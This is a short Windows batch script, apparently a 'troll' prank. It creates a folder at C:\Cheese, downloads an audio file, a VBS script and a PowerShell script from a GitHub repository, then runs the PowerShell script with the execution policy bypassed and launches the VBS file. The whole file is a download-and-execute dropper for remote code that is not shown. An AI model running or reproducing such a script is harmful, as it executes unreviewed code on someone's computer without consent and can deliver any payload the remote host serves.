cd /D C:\
mkdir Cheese
cd cheese
powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Troll/Trolled.mp3' -OutFile ".\Trolled.mp3"
powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Troll/Test.vbs' -OutFile ".\Test.vbs"
powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Troll/A.ps1' -OutFile ".\A.ps1"
powershell -ExecutionPolicy Bypass -File A.ps1
start Test.vbs
